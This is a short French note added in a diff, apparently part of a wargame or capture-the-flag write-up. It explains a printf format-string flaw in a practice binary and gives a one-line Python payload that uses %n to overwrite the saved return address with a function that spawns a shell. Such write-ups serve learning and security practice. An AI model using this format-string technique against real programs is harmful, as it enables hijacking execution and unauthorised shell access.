@@ -1,0 +1,10 @@
+encore une faille de printf ici : 
+on voit que juste apres le printf il call exit
+on voit une fonction o() qui appelle system("/bin/sh")
+
+du coup on va essayer d'ecraser la sauvegarde de l'eip quand on lance printf par l'adresse de o, avec le meme procede que les levels d'avant (bon la ca commence a faire beaucoup de blanks, faudrait songer a faire byte par byte mais j'ai la flemme)
+
+payload:
+
+python -c "print '\xcc\xf4\xff\xbf' + '%p--'*2 + '%134513805p' + '%n'" > /tmp/4
+				  (sauvegarde eip)				  (adresse o)
